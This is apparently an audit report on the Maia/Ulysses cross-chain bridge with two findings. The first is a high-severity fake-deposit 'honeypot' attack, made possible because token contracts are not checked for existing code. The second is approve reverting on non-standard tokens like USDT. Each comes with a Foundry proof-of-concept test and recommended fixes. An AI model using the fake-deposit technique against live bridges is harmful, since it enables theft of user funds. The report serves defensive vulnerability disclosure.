## H-01
Solady ERC20 does not check for token contract's existence, which opens up possibility for a honeypot attack

## Impact
There is a subtle difference between the implementation of solady (solmate’s) SafeTransferLib and OZ’s SafeERC20: OZ’s SafeERC20 checks if the token is a contract or not, solady’s SafeTransferLib does not. (it's based on solmate safetransferlib)
See: https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L10
Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.
As a result, when the token’s address has no code, the transaction will just succeed with no error.
This attack vector was made well-known by the [qBridge hack back in Jan 2022](https://www.halborn.com/blog/post/explained-the-qubit-hack-january-2022).

It’s becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.

A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to create fake deposits. For example: 1INCH is using the same token address for both Ethereum and BSC; Gelato's $GEL token is using the same token address for Ethereum, Fantom and Polygon. Also, attacker can frontrun one new token deployment and create fake deposits before it hit the chain.

This attack vector can be exploited creating fake Deposits here:
https://github.com/code-423n4/2023-09-maia/blob/746905cdd3aa165ba1f9274c360dfd9f0c52e781/src/ArbitrumBranchPort.sol#L128
https://github.com/code-423n4/2023-09-maia/blob/746905cdd3aa165ba1f9274c360dfd9f0c52e781/src/BranchPort.sol#L532

## Proof of Concept
Copy this code to [BranchBridgeAgentTest.t.sol](https://github.com/code-423n4/2023-09-maia/blob/main/test/ulysses-omnichain/BranchBridgeAgentTest.t.sol)
```
    function testCallOutSignedAndBridgeFakeToken() public {
        testCallOutSignedAndBridgeFakeToken(address(this), 100 ether);
    }
    function testCallOutSignedAndBridgeFakeToken(address _user, uint256 _amount) public {
        // Input restrictions
        if (_user < address(3)) _user = address(3);
        else if (_user == localPortAddress) _user = address(uint160(_user) - 10);

        // Prank into user account
        vm.startPrank(_user);

        // Get some gas.
        vm.deal(_user, 1 ether);

        //GasParams
        GasParams memory gasParams = GasParams(0.5 ether, 0.5 ether);

         // Prepare deposit info
        DepositInput memory depositInput = DepositInput({
            hToken: address(testToken),
            // token: address(underlyingToken),
            token: address(0x15b7c0c907e4C6b9AdaAaabC300C08991D6CEA05), // GEL token
            amount: _amount,
            deposit: _amount
        });

        uint32 depositNonce = bAgent.depositNonce();

        expectLayerZeroSend(
            1 ether,
            abi.encodePacked(
                bytes1(0x85),
                _user,
                depositNonce,
                depositInput.hToken,
                depositInput.token,
                depositInput.amount,
                depositInput.deposit,
                "testdata"
            ),
            _user,
            gasParams
        );

        //Call Deposit function
        bAgent.callOutSignedAndBridge{value: 1 ether}(payable(_user), "testdata", depositInput, gasParams, true);

        // Prank out of user account
        vm.stopPrank();

        assertEq(bAgent.depositNonce(), depositNonce + 1);

        // Test If Deposit was successful
        //testCreateDepositSingle(uint32(1), _user, address(testToken), address(underlyingToken), _amount, _amount);
        
        // Get Deposit
        Deposit memory deposit = bRouter.getDepositEntry(uint32(1));
        console2.log(deposit.owner);
        console2.log(deposit.status);
        console2.log(deposit.amounts[0]);
        console2.log(deposit.deposits[0]);
        console2.log(deposit.tokens[0]);
        console2.log(deposit.hTokens[0]);

        // Store user for usage in other tests
        storedFallbackUser = _user;
    }
```

Since you got a fake deposit array stored, now the attacker can just wait until the token get to the local chain and call redeemDeposit, retrieveDeposit or retryDeposit. This vulnerability introduces numerous potential attack vectors.

## Tools Used
Foundry, VS Code

## Recommended Mitigation Steps:
Verify if the token has code.
Example:
```
    require(_underlyingAddress.code.length > 0, "token is not contract");
```
---

## M-01
ERC20(_token).approve revert if the underlying ERC20 token approve does not return boolean

## Impact
When transferring the token, the protocol use safeTransfer and safeTransferFrom 
but when approving the payout token, the safeApprove is not used
for non-standard token such as USDT,
calling approve will revert because the solmate ERC20 enforce the underlying token return a boolean
https://github.com/transmissions11/solmate/blob/bfc9c25865a274a7827fea5abf6e4fb64fc64e6c/src/tokens/ERC20.sol#L68
```
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }
```
while the token such as USDT does not return boolean:
https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L199


In the _transferAndApproveToken function, as detailed [here](https://github.com/code-423n4/2023-09-maia/blob/main/src/BaseBranchRouter.sol#L174), the operation will revert if the _token is USDT or another ERC20 token that does not return a boolean for the approve method.

## Proof of Concept
Add the following lines to [BranchBridgeAgentTest.t.sol](https://github.com/code-423n4/2023-09-maia/blob/main/test/ulysses-omnichain/BranchBridgeAgentTest.t.sol)

[Line5](https://github.com/code-423n4/2023-09-maia/blob/main/test/ulysses-omnichain/BranchBridgeAgentTest.t.sol#L5)
``` 
import {MissingReturnToken} from "solmate/test/utils/weird-tokens/MissingReturnToken.sol";
```
[Line12](https://github.com/code-423n4/2023-09-maia/blob/main/test/ulysses-omnichain/BranchBridgeAgentTest.t.sol#L12)
```
    MissingReturnToken underlyingTokenUSDT;
```
Inside [setUp() function](https://github.com/code-423n4/2023-09-maia/blob/main/test/ulysses-omnichain/BranchBridgeAgentTest.t.sol#L31):
```
        underlyingTokenUSDT = new MissingReturnToken();
```
Create a new functions using the new underlying Token
```
    function testCallOutWithDepositNoReturnApprovePOC() public {
        testCallOutWithDepositNoReturnApprovePOC(address(this), 100 ether);
    }

    function testCallOutWithDepositNoReturnApprovePOC(address _user, uint256 _amount) public {
        // Input restrictions
        if (_user < address(3)) _user = address(3);
        else if (_user == localPortAddress) _user = address(uint160(_user) - 10);

        // Prank into user account
        vm.startPrank(_user);

        // Get some gas.
        vm.deal(_user, 1 ether);

        //GasParams
        GasParams memory gasParams = GasParams(0.5 ether, 0.5 ether);

        //Mint Test tokens.
        // underlyingToken.mint(_user, _amount);
        underlyingTokenUSDT.mint(_user, _amount+1);

        //Approve spend by router
        // underlyingToken.approve(address(bRouter), _amount);
        underlyingTokenUSDT.approve(address(bRouter), _amount);


        console2.log("Test CallOut Addresses:");
        // console2.log(address(testToken), address(underlyingToken));
        console2.log(address(testToken), address(underlyingTokenUSDT));


        // Prepare deposit info
        DepositInput memory depositInput = DepositInput({
            hToken: address(testToken),
            // token: address(underlyingToken),
            token: address(underlyingTokenUSDT),
            amount: _amount,
            deposit: _amount
        });

        uint32 depositNonce = bAgent.depositNonce();

        expectLayerZeroSend(
            1 ether,
            abi.encodePacked(
                bytes1(0x02),
                depositNonce,
                depositInput.hToken,
                depositInput.token,
                depositInput.amount,
                depositInput.deposit,
                "testdata"
            ),
            _user,
            gasParams
        );

        //Call Deposit function
        IBranchRouter(bRouter).callOutAndBridge{value: 1 ether}("testdata", depositInput, gasParams);

        // Prank out of user account
        vm.stopPrank();

        assertEq(bAgent.depositNonce(), depositNonce + 1);

        // Test If Deposit was successful
        testCreateDepositSingle(uint32(1), _user, address(testToken), address(underlyingToken), _amount, _amount);
    }
```
Return:
```
[FAIL. Reason: Expected call to 0x000000000000000000000000000000000000cafe with data 0xc5803100000000000000000000000000000000000000000000000000000000000000a4b100000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000beef7b0aa1e6fcd181d45c94ac62901722231074d8d4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007502000000010f8458e544c9d4c7c25a881240727209caae20b82a9e8fa175f45b235efddd97d2727741ef4eee6300000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001746573746461746100000000000000000000000000000000000000000000000000000000000000000000000000000000000056000200000000000000000000000000000000000000000000000006f05b59d3b2000000000000000000000000000000000000000000000000000006f05b59d3b20000000000000000000000000000000000000000beef00000000000000000000 and value 1000000000000000000 to be called 1 time(s), but the call reverted instead. Ensure you're testing the happy path when using the expectCall cheatcode Counterexample: calldata=0xfdd5db5800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001, args=[0x0000000000000000000000000000000000000000, 1]] testCallOutWithDepositNoReturnApprovePOC(address,uint256) (runs: 1, μ: 463309, ~: 463309)
```

## Tools Used
Foundry, VS Code

## Recommended Mitigation Steps:

1. **Utilize `safeApprove`**: 
    - While it's the most straightforward solution, it's important to note that `safeApprove` is deprecated by OpenZeppelin.
   
2. **Implement Try-Catch**: 
    - To handle potential reverts, consider using a try-catch mechanism around the approval call. Subsequently, verify the allowance to ensure that it has been set correctly.

3. **Alternative Interfaces**: 
    - Given the nuances of different ERC20 implementations, consider employing distinct interfaces or adapter patterns when interacting with ERC20 tokens that have non-standard behaviors.